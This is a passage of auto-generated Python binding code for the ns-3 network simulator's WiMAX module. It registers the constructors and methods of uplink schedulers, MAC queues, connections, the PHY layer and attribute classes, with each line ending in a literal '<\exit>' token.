[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('ServiceBandwidthRequests',<\exit>
'bool',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('ServiceBandwidthRequestsBytes',<\exit>
'bool',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols'), param('uint32_t', 'allocationSizeBytes')])<\exit>
cls.add_method('ServiceUnsolicitedGrants',<\exit>
'void',<\exit>
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetupServiceFlow',<\exit>
'void',<\exit>
[param('ns3::SSRecord *', 'ssRecord'), param('ns3::ServiceFlow *', 'serviceFlow')],<\exit>
is_virtual=True)<\exit>
cls.add_method('UplinkSchedWindowTimer',<\exit>
'void',<\exit>
[])<\exit>
return<\exit>
def register_Ns3UplinkSchedulerRtps_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::UplinkSchedulerRtps const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')])<\exit>
cls.add_method('AddUplinkAllocation',<\exit>
'void',<\exit>
[param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('uint32_t const &', 'allocationSize'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('AllocateInitialRangingInterval',<\exit>
'void',<\exit>
[param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('CalculateAllocationStartTime',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetChannelDescriptorsToUpdate',<\exit>
'void',<\exit>
[param('bool &', 'arg0'), param('bool &', 'arg1'), param('bool &', 'arg2'), param('bool &', 'arg3')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetUplinkAllocations',<\exit>
'std::list< ns3::OfdmUlMapIe >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('InitOnce',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('OnSetRequestedBandwidth',<\exit>
'void',<\exit>
[param('ns3::ServiceFlowRecord *', 'sfr')],<\exit>
is_virtual=True)<\exit>
cls.add_method('ProcessBandwidthRequest',<\exit>
'void',<\exit>
[param('ns3::BandwidthRequestHeader const &', 'bwRequestHdr')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Schedule',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('ServiceBandwidthRequests',<\exit>
'void',<\exit>
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('ServiceBandwidthRequests',<\exit>
'bool',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('ServiceUnsolicitedGrants',<\exit>
'void',<\exit>
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetupServiceFlow',<\exit>
'void',<\exit>
[param('ns3::SSRecord *', 'ssRecord'), param('ns3::ServiceFlow *', 'serviceFlow')],<\exit>
is_virtual=True)<\exit>
cls.add_method('ULSchedulerRTPSConnection',<\exit>
'void',<\exit>
[param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')])<\exit>
return<\exit>
def register_Ns3UplinkSchedulerSimple_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::UplinkSchedulerSimple const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')])<\exit>
cls.add_method('AddUplinkAllocation',<\exit>
'void',<\exit>
[param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('uint32_t const &', 'allocationSize'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('AllocateInitialRangingInterval',<\exit>
'void',<\exit>
[param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('CalculateAllocationStartTime',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetChannelDescriptorsToUpdate',<\exit>
'void',<\exit>
[param('bool &', 'arg0'), param('bool &', 'arg1'), param('bool &', 'arg2'), param('bool &', 'arg3')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetUplinkAllocations',<\exit>
'std::list< ns3::OfdmUlMapIe >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('InitOnce',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('OnSetRequestedBandwidth',<\exit>
'void',<\exit>
[param('ns3::ServiceFlowRecord *', 'sfr')],<\exit>
is_virtual=True)<\exit>
cls.add_method('ProcessBandwidthRequest',<\exit>
'void',<\exit>
[param('ns3::BandwidthRequestHeader const &', 'bwRequestHdr')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Schedule',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('ServiceBandwidthRequests',<\exit>
'void',<\exit>
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('ServiceBandwidthRequests',<\exit>
'bool',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('ServiceUnsolicitedGrants',<\exit>
'void',<\exit>
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetupServiceFlow',<\exit>
'void',<\exit>
[param('ns3::SSRecord *', 'ssRecord'), param('ns3::ServiceFlow *', 'serviceFlow')],<\exit>
is_virtual=True)<\exit>
return<\exit>
def register_Ns3WimaxConnection_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::WimaxConnection const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::Cid', 'cid'), param('ns3::Cid::Type', 'type')])<\exit>
cls.add_method('ClearFragmentsQueue',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('Dequeue',<\exit>
'ns3::Ptr< ns3::Packet >',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType', default_value='::ns3::MacHeaderType::HEADER_TYPE_GENERIC')])<\exit>
cls.add_method('Dequeue',<\exit>
'ns3::Ptr< ns3::Packet >',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType'), param('uint32_t', 'availableByte')])<\exit>
cls.add_method('Enqueue',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::MacHeaderType const &', 'hdrType'), param('ns3::GenericMacHeader const &', 'hdr')])<\exit>
cls.add_method('FragmentEnqueue',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::Packet const >', 'fragment')])<\exit>
cls.add_method('GetCid',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFragmentsQueue',<\exit>
'std::list< ns3::Ptr< ns3::Packet const > > const',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetQueue',<\exit>
'ns3::Ptr< ns3::WimaxMacQueue >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSchedulingType',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetServiceFlow',<\exit>
'ns3::ServiceFlow *',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetType',<\exit>
'ns3::Cid::Type',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetTypeStr',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('HasPackets',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('HasPackets',<\exit>
'bool',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType')],<\exit>
is_const=True)<\exit>
cls.add_method('SetServiceFlow',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow *', 'serviceFlow')])<\exit>
cls.add_method('DoDispose',<\exit>
'void',<\exit>
[],<\exit>
visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3WimaxMacQueue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::WimaxMacQueue const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('uint32_t', 'maxSize')])<\exit>
cls.add_method('CheckForFragmentation',<\exit>
'bool',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType')])<\exit>
cls.add_method('Dequeue',<\exit>
'ns3::Ptr< ns3::Packet >',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType')])<\exit>
cls.add_method('Dequeue',<\exit>
'ns3::Ptr< ns3::Packet >',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType'), param('uint32_t', 'availableByte')])<\exit>
cls.add_method('Enqueue',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::MacHeaderType const &', 'hdrType'), param('ns3::GenericMacHeader const &', 'hdr')])<\exit>
cls.add_method('GetFirstPacketHdrSize',<\exit>
'uint32_t',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType')])<\exit>
cls.add_method('GetFirstPacketPayloadSize',<\exit>
'uint32_t',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType')])<\exit>
cls.add_method('GetFirstPacketRequiredByte',<\exit>
'uint32_t',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType')])<\exit>
cls.add_method('GetMaxSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNBytes',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPacketQueue',<\exit>
'std::deque< ns3::WimaxMacQueue::QueueElement > const &',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetQueueLengthWithMACOverhead',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('IsEmpty',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('IsEmpty',<\exit>
'bool',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType')],<\exit>
is_const=True)<\exit>
cls.add_method('Peek',<\exit>
'ns3::Ptr< ns3::Packet >',<\exit>
[param('ns3::GenericMacHeader &', 'hdr')],<\exit>
is_const=True)<\exit>
cls.add_method('Peek',<\exit>
'ns3::Ptr< ns3::Packet >',<\exit>
[param('ns3::GenericMacHeader &', 'hdr'), param('ns3::Time &', 'timeStamp')],<\exit>
is_const=True)<\exit>
cls.add_method('Peek',<\exit>
'ns3::Ptr< ns3::Packet >',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType')],<\exit>
is_const=True)<\exit>
cls.add_method('Peek',<\exit>
'ns3::Ptr< ns3::Packet >',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType'), param('ns3::Time &', 'timeStamp')],<\exit>
is_const=True)<\exit>
cls.add_method('SetFragmentNumber',<\exit>
'void',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType')])<\exit>
cls.add_method('SetFragmentOffset',<\exit>
'void',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType'), param('uint32_t', 'offset')])<\exit>
cls.add_method('SetFragmentation',<\exit>
'void',<\exit>
[param('ns3::MacHeaderType::HeaderType', 'packetType')])<\exit>
cls.add_method('SetMaxSize',<\exit>
'void',<\exit>
[param('uint32_t', 'maxSize')])<\exit>
return<\exit>
def register_Ns3WimaxMacToMacHeader_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::WimaxMacToMacHeader const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('uint32_t', 'len')])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetSizeOfLen',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3WimaxPhy_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::WimaxPhy const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Attach',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxChannel >', 'channel')])<\exit>
cls.add_method('DoDispose',<\exit>
'void',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetChannel',<\exit>
'ns3::Ptr< ns3::WimaxChannel >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetChannelBandwidth',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetChnlSrchTimeoutEvent',<\exit>
'ns3::EventId',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetDataRate',<\exit>
'uint32_t',<\exit>
[param('ns3::WimaxPhy::ModulationType', 'modulationType')],<\exit>
is_const=True)<\exit>
cls.add_method('GetDevice',<\exit>
'ns3::Ptr< ns3::NetDevice >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFrameDuration',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFrameDuration',<\exit>
'ns3::Time',<\exit>
[param('uint8_t', 'frameDurationCode')],<\exit>
is_const=True)<\exit>
cls.add_method('GetFrameDurationCode',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFrameDurationSec',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFrequency',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetGValue',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetMobility',<\exit>
'ns3::Ptr< ns3::Object >',<\exit>
[],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetNfft',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNrBytes',<\exit>
'uint64_t',<\exit>
[param('uint32_t', 'symbols'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],<\exit>
is_const=True)<\exit>
cls.add_method('GetNrCarriers',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetNrSymbols',<\exit>
'uint64_t',<\exit>
[param('uint32_t', 'size'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],<\exit>
is_const=True)<\exit>
cls.add_method('GetPhyType',<\exit>
'ns3::WimaxPhy::PhyType',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetPsDuration',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPsPerFrame',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPsPerSymbol',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetReceiveCallback',<\exit>
'ns3::Callback< void, ns3::Ptr< ns3::PacketBurst const >, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRtg',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetRxFrequency',<\exit>
'uint64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSamplingFactor',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSamplingFrequency',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetScanningFrequency',<\exit>
'uint64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetState',<\exit>
'ns3::WimaxPhy::PhyState',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSymbolDuration',<\exit>
'ns3::Time',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSymbolsPerFrame',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTransmissionTime',<\exit>
'ns3::Time',<\exit>
[param('uint32_t', 'size'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],<\exit>
is_const=True)<\exit>
cls.add_method('GetTtg',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTxFrequency',<\exit>
'uint64_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('IsDuplex',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Send',<\exit>
'void',<\exit>
[param('ns3::SendParams *', 'params')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SetChannelBandwidth',<\exit>
'void',<\exit>
[param('uint32_t', 'channelBandwidth')])<\exit>
cls.add_method('SetDataRates',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('SetDevice',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxNetDevice >', 'device')])<\exit>
cls.add_method('SetDuplex',<\exit>
'void',<\exit>
[param('uint64_t', 'rxFrequency'), param('uint64_t', 'txFrequency')])<\exit>
cls.add_method('SetFrameDuration',<\exit>
'void',<\exit>
[param('ns3::Time', 'frameDuration')])<\exit>
cls.add_method('SetFrequency',<\exit>
'void',<\exit>
[param('uint32_t', 'frequency')])<\exit>
cls.add_method('SetMobility',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::Object >', 'mobility')],<\exit>
is_virtual=True)<\exit>
cls.add_method('SetNrCarriers',<\exit>
'void',<\exit>
[param('uint8_t', 'nrCarriers')])<\exit>
cls.add_method('SetPhyParameters',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('SetPsDuration',<\exit>
'void',<\exit>
[param('ns3::Time', 'psDuration')])<\exit>
cls.add_method('SetPsPerFrame',<\exit>
'void',<\exit>
[param('uint16_t', 'psPerFrame')])<\exit>
cls.add_method('SetPsPerSymbol',<\exit>
'void',<\exit>
[param('uint16_t', 'psPerSymbol')])<\exit>
cls.add_method('SetReceiveCallback',<\exit>
'void',<\exit>
[param('ns3::Callback< void, ns3::Ptr< ns3::PacketBurst const >, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'callback')])<\exit>
cls.add_method('SetScanningCallback',<\exit>
'void',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetSimplex',<\exit>
'void',<\exit>
[param('uint64_t', 'frequency')])<\exit>
cls.add_method('SetState',<\exit>
'void',<\exit>
[param('ns3::WimaxPhy::PhyState', 'state')])<\exit>
cls.add_method('SetSymbolDuration',<\exit>
'void',<\exit>
[param('ns3::Time', 'symbolDuration')])<\exit>
cls.add_method('SetSymbolsPerFrame',<\exit>
'void',<\exit>
[param('uint32_t', 'symbolsPerFrame')])<\exit>
cls.add_method('StartScanning',<\exit>
'void',<\exit>
[param('uint64_t', 'frequency'), param('ns3::Time', 'timeout'), param('ns3::Callback< void, bool, unsigned long, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'callback')])<\exit>
cls.add_method('DoAttach',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxChannel >', 'channel')],<\exit>
is_pure_virtual=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetDataRate',<\exit>
'uint32_t',<\exit>
[param('ns3::WimaxPhy::ModulationType', 'modulationType')],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetFrameDuration',<\exit>
'ns3::Time',<\exit>
[param('uint8_t', 'frameDurationCode')],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetFrameDurationCode',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetGValue',<\exit>
'double',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetNfft',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetNrBytes',<\exit>
'uint64_t',<\exit>
[param('uint32_t', 'symbols'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetNrSymbols',<\exit>
'uint64_t',<\exit>
[param('uint32_t', 'size'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetRtg',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetSamplingFactor',<\exit>
'double',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetSamplingFrequency',<\exit>
'double',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetTransmissionTime',<\exit>
'ns3::Time',<\exit>
[param('uint32_t', 'size'), param('ns3::WimaxPhy::ModulationType', 'modulationType')],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoGetTtg',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoSetDataRates',<\exit>
'void',<\exit>
[],<\exit>
is_pure_virtual=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DoSetPhyParameters',<\exit>
'void',<\exit>
[],<\exit>
is_pure_virtual=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3AttributeAccessor_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::AttributeAccessor const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Get',<\exit>
'bool',<\exit>
[param('ns3::ObjectBase const *', 'object'), param('ns3::AttributeValue &', 'attribute')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('HasGetter',<\exit>
'bool',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('HasSetter',<\exit>
'bool',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('Set',<\exit>
'bool',<\exit>
[param('ns3::ObjectBase *', 'object', transfer_ownership=False), param('ns3::AttributeValue const &', 'value')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3AttributeChecker_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::AttributeChecker const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Check',<\exit>
'bool',<\exit>
[param('ns3::AttributeValue const &', 'value')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('Copy',<\exit>
'bool',<\exit>
[param('ns3::AttributeValue const &', 'source'), param('ns3::AttributeValue &', 'destination')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('Create',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('CreateValidValue',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[param('ns3::AttributeValue const &', 'value')],<\exit>
is_const=True)<\exit>
cls.add_method('GetUnderlyingTypeInformation',<\exit>
'std::string',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetValueTypeName',<\exit>
'std::string',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('HasUnderlyingTypeInformation',<\exit>
'bool',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3AttributeValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::AttributeValue const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3BSScheduler_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::BSScheduler const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')])<\exit>
cls.add_method('AddDownlinkBurst',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::WimaxConnection const >', 'connection'), param('uint8_t', 'diuc'), param('ns3::WimaxPhy::ModulationType', 'modulationType'), param('ns3::Ptr< ns3::PacketBurst >', 'burst')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
